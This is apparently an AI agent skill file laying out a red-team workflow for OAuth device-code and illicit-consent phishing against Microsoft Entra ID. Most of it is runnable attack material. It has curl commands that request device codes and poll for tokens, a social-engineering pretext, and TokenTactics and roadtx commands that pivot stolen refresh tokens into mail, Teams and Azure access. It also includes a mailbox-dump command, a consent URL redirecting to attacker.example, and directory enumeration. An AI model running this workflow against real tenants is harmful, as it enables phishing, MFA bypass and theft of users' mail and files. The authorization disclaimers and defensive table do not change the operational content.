---
name: attacking-oauth-with-device-code-phishing
description: Run OAuth 2.0 device-code and illicit-consent phishing attacks against Microsoft Entra ID, using TokenTactics-style tooling to steal access and refresh tokens, bypass MFA, and pivot across Microsoft 365 services.
subdomain: identity-access-management
facing: config
mitre_attack:
- T1528
nist_csf:
- PR.AA-03
upstream: attacking-oauth-with-device-code-phishing@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.
> Legal: This skill is for authorized security testing, red-team engagements, and educational purposes only. Device-code and consent-grant phishing manipulate real users into authorizing attacker-controlled access to corporate identities. Execute only against tenants you own or have explicit written authorization (rules of engagement) to test. Unauthorized use violates the Computer Fraud and Abuse Act and equivalent laws worldwide.

## Prerequisites

- Written authorization / rules of engagement explicitly permitting phishing and token theft against target tenant
- Controlled pretext-delivery channel (sanctioned phishing infrastructure or internal test mailbox)
- Linux or Windows attacker host with Python 3.8+ and PowerShell 7+
- TokenTactics (PowerShell) and ROADtools (Python) installed:
  ```bash
  # ROADtools (roadrecon + roadtx) — Dirk-jan Mollema / Outsider Security
  pip install roadtools roadtools_auth
  # roadtx (ROADtools Token eXchange) ships in roadtools_auth
  roadtx --help

  # TokenTactics v2 (rvrsh3ll)
  git clone https://github.com/rvrsh3ll/TokenTactics.git
  pwsh -c "Import-Module ./TokenTactics/TokenTactics.psd1"
  ```
- Familiarity with OAuth 2.0 grant types, JWT structure, and Microsoft Graph scopes

## MITRE ATT&CK Mapping

| ID | Technique | Application in this skill |
|----|-----------|---------------------------|
| T1528 | Steal Application Access Token | Phishing device-code flow / consent grant yields attacker-controlled OAuth access and refresh tokens that are reused to access cloud services without re-authenticating |

Related techniques frequently chained: **T1566** Phishing (delivery), **T1550.001** Application Access Token (replaying stolen tokens), **T1098.003** Account Manipulation: Additional Cloud Roles (consent grant persistence).

## Workflow

### Phase 1: Initiate Device-Code Request

Attacker requests device code from Entra ID, choosing first-party client that victim implicitly trusts. Microsoft Office client ID `d3590ed6-52b3-4102-aeff-aad2292ab01c` is commonly used because it is pre-authorized for broad first-party resources.

1. Request device code directly via token endpoint:
   ```bash
   # client_id = Microsoft Office; scope requests offline_access for a long-lived refresh token
   curl -s -X POST \
     'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode' \
     -d 'client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c' \
     -d 'scope=https://graph.microsoft.com/.default offline_access' | tee devicecode.json
   ```
2. JSON response contains fields you weaponize:
   ```json
   {
     "user_code": "B7HVQXKZ2",
     "device_code": "GMMhmHCXhWEzkobqIHGG_EnNYYsAkukHspeYUk9E8...",
     "verification_uri": "https://microsoft.com/devicelogin",
     "expires_in": 900,
     "interval": 5,
     "message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code B7HVQXKZ2 to authenticate."
   }
   ```
3. Note the 15-minute (`expires_in: 900`) validity window — pretext must drive victim to authenticate quickly.

   Equivalent using TokenTactics (handles polling automatically):
   ```powershell
   Import-Module ./TokenTactics/TokenTactics.psd1
   # Generates a device code and begins polling; prints the user_code to phish
   Get-AzureToken -Client MSGraph
   ```

### Phase 2: Deliver Pretext

Phishing message must NOT contain credential-harvesting link — victim authenticates on real Microsoft page, which is what defeats user suspicion and MFA.

1. Craft pretext that references genuine `https://microsoft.com/devicelogin` URL and the `user_code` (e.g., "IT is enrolling your account in new Teams Rooms device; open microsoft.com/devicelogin and enter code B7HVQXKZ2 within 15 minutes").
2. Send through sanctioned phishing infrastructure. Hyperlinked codes/URLs frequently land in spam, so present URL and code as plain text.
3. Time delivery to start of polling cycle so code is fresh.

### Phase 3: Poll and Capture Tokens

While victim authenticates and approves, poll token endpoint with the `device_code` until tokens are issued.

1. Poll at server-specified `interval` (5 seconds); `authorization_pending` is expected until victim completes sign-in:
   ```bash
   DEVICE_CODE=$(python -c "import json;print(json.load(open('devicecode.json'))['device_code'])")
   while true; do
     RESP=$(curl -s -X POST \
       'https://login.microsoftonline.com/organizations/oauth2/v2.0/token' \
       -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code' \
       -d 'client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c' \
       -d "device_code=${DEVICE_CODE}")
     echo "$RESP" | grep -q access_token && { echo "$RESP" > tokens.json; break; }
     echo "$RESP" | grep -q authorization_pending || echo "$RESP"
     sleep 5
   done
   ```
2. On success response yields `access_token`, `refresh_token`, `id_token`, `expires_in`, and granted `scope`.
3. Decode access token to confirm captured identity, audience, and scopes:
   ```bash
   python -c "import json,base64;p=json.load(open('tokens.json'))['access_token'].split('.')[1];print(json.loads(base64.urlsafe_b64decode(p+'=='*(-len(p)%4))))"
   ```

### Phase 4: Refresh Across Microsoft 365 Resources

Refresh token (with `offline_access`) can be redeemed for tokens scoped to other first-party resources, expanding access beyond original scope.

1. Use TokenTactics refresh functions to pivot refresh token to specific services:
   ```powershell
   # $response holds the device-code result from Get-AzureToken
   $rt = $response.refresh_token
   Invoke-RefreshToOutlookToken          -domain target.com -refreshToken $rt   # mailbox access
   Invoke-RefreshToMSGraphToken          -domain target.com -refreshToken $rt   # Graph
   Invoke-RefreshToMSTeamsToken          -domain target.com -refreshToken $rt   # Teams
   Invoke-RefreshToAzureCoreManagementToken -domain target.com -refreshToken $rt # ARM
   Invoke-RefreshToSubstrateToken        -domain target.com -refreshToken $rt
   ```
2. Equivalently with roadtx, redeem refresh token for new resource:
   ```bash
   roadtx refreshtokento \
     -r "$(python -c "import json;print(json.load(open('tokens.json'))['refresh_token'])")" \
     -c d3590ed6-52b3-4102-aeff-aad2292ab01c \
     -s https://graph.microsoft.com/.default
   ```
3. Demonstrate mailbox access to prove impact (read-only, scoped to engagement rules):
   ```powershell
   Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $response.access_token -mailFolder Inbox
   ```

### Phase 5: Illicit Consent Grant Variant

Instead of device-code, register malicious multi-tenant app and phish victim to consent to delegated Graph permissions for durable, password-reset-surviving access.

1. Register multi-tenant app in attacker tenant requesting delegated scopes such as `Mail.Read`, `Files.ReadWrite.All`, `offline_access`.
2. Build user-consent URL and phish it:
   ```text
   https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
     client_id=<ATTACKER_APP_ID>
     &response_type=code
     &redirect_uri=https://attacker.example/callback
     &response_mode=query
     &scope=offline_access%20Mail.Read%20Files.ReadWrite.All
     &state=12345
   ```
3. When victim consents, exchange returned `code` for tokens:
   ```bash
   curl -s -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/token' \
     -d 'client_id=<ATTACKER_APP_ID>' \
     -d 'grant_type=authorization_code' \
     -d 'code=<AUTH_CODE>' \
     -d 'redirect_uri=https://attacker.example/callback' \
     -d 'client_secret=<APP_SECRET>' \
     -d 'scope=offline_access Mail.Read Files.ReadWrite.All'
   ```
4. Consented OAuth grant persists as service-principal grant in victim tenant until admin revokes it (`Remove-MgServicePrincipalOauth2PermissionGrant`).

### Phase 6: Enumerate Impact with ROADtools

1. Authenticate roadrecon with captured token / refresh token and dump directory:
   ```bash
   roadrecon auth --refresh-token "$(python -c "import json;print(json.load(open('tokens.json'))['refresh_token'])")" \
     -c d3590ed6-52b3-4102-aeff-aad2292ab01c
   roadrecon gather
   roadrecon gui   # browse users, groups, app registrations, role assignments
   ```
2. Identify high-value access: role assignments, owned applications, accessible SharePoint sites, and additional consent grants.
3. Record exactly what data and roles stolen tokens reached for engagement report.

## Tools and Resources

| Tool | Purpose | Source |
|------|---------|--------|
| TokenTactics v2 | Generate device codes and refresh tokens across M365 services | https://github.com/rvrsh3ll/TokenTactics |
| ROADtools (roadrecon / roadtx) | Token exchange, directory enumeration, access mapping | https://github.com/dirkjanm/ROADtools |
| AADInternals | Entra ID attack/recon PowerShell toolkit | https://github.com/Gerenios/AADInternals |
| RFC 8628 | OAuth 2.0 Device Authorization Grant specification | https://datatracker.ietf.org/doc/html/rfc8628 |
| Microsoft / Storm-2372 advisory | Device-code phishing campaign analysis | https://www.microsoft.com/en-us/security/blog/ |
| Mandiant M-Trends | OAuth token theft trend reporting | https://cloud.google.com/security/resources/m-trends |

## Defensive Recommendations

| Control | Effect |
|---------|--------|
| Conditional Access policy blocking device-code flow (`authenticationFlows`) for users who do not need it | Removes attack surface for most users |
| Phishing-resistant MFA (FIDO2 / passkeys) + token protection (token binding) | Bound tokens cannot be replayed off victim device |
| Restrict user consent to verified publishers / require admin consent | Blocks illicit-consent grants |
| Sign-in frequency + shorter session lifetimes on untrusted networks | Limits refresh-token longevity |
| Monitor `AADNonInteractiveUserSignInLogs` for device-code grants and anomalous token use | Detection (see `hunting-saas-sso-token-abuse`) |

## Validation Criteria

- [ ] Device-code request returned valid `user_code` and `device_code`
- [ ] Pretext delivered referencing genuine Microsoft device-login page (no harvesting link)
- [ ] Token endpoint polled and `access_token` + `refresh_token` captured
- [ ] Access token decoded to confirm captured identity, audience, and scopes
- [ ] Refresh token successfully exchanged for at least one additional M365 resource
- [ ] MFA bypass demonstrated (victim completed MFA; attacker holds usable tokens)
- [ ] Illicit-consent variant tested or documented as out of scope
- [ ] Accessible resources enumerated with ROADtools and recorded
- [ ] Remediation recommendations (CA device-code block, FIDO2, consent restrictions) delivered

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/attacking-oauth-with-device-code-phishing
